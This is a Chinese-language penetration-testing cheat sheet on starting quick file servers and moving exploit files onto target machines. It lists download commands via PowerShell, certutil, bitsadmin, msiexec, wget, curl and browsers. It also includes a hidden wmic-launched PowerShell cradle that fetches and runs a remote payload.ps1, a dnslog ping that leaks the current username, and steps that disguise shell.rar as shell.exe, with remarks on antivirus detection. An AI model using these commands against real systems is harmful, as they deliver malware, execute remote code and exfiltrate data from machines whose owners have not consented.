快速开启一个HTTP Server

Python HTTP: 
python -m SimpleHTTPServer 8080
Python3 HTTP: 
python3 -m http.server 8080
Python FTP: 
python -m pyftpdlib -p 8080
Python3 SMB: 
python3 impacket-smbserver.py files . -port 8080
PHP 5.4+: 
php -S 0.0.0.0:8080
Ruby: 
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8080, :DocumentRoot => Dir.pwd).start'
Ruby 1.9.2+: 
ruby -run -e httpd . -p 8080
busybox httpd: 
busybox httpd -f -p 8080

快速进行文件下载Download the files

PowerShell - IWR: 
powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/ms10-051.exe -OutFile exploit.exe"
PowerShell - IEX: 
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/ms10-051.exe', exploit.exe)"
CMD - Certutil: 
certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe
CMD - SMB: 
copy \\127.0.0.1\files\ms10-051.exe exploit.exe
Linux - wget: 
wget http://127.0.0.1:8080/ms10-051.exe -O exploit.exe
Linux - curl: 
curl http://127.0.0.1:8080/ms10-051.exe -o exploit.exe
Windows Bitsadmin: 
bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/ms10-051.exe" c:\\exploit.exe

msiexec /q /i http://127.0.0.1:8080/ms10-051.exe
Windows msiexec:

Windows CertUtil.exe 
#准备：base64+url编码的webshell.jsp，CertUtil进行解码:
#CertUtil解码:

#注意：以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令。
Windows wmic: 在后台运行。wmic进行powershell下载执行，如cs的powershell。 
wmic PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xxx.com/payload.ps1'))\""
浏览器 下载: 
1、前提条件：
一般浏览器下载默认路径为： C:\Users\当前用户名字\Downloads\ 

通过dnslog外带当年用户名 
ping %USERNAME%.4e4ppf.dnslog.cn 
如果是powershell则 
cmd /c ping %USERNAME%.xb1y2y.dnslog.cn
2、使用默认浏览器下载 
pcalua -m -a http://192.168.31.205/shell.rar
3、其他浏览器 
start msedge http://192.168.31.205/shell.rar
start chrome http://192.168.31.205/shell.rar
start firefox http://192.168.31.205/shell.rar
4、下载之后进行重命名
rename shell.rar shell.exe
5、或者直接：
start msedge http://192.168.31.205/shell.rar && ping -n 10 127.0.0.1 >NUL && rename shell.rar shell.exe
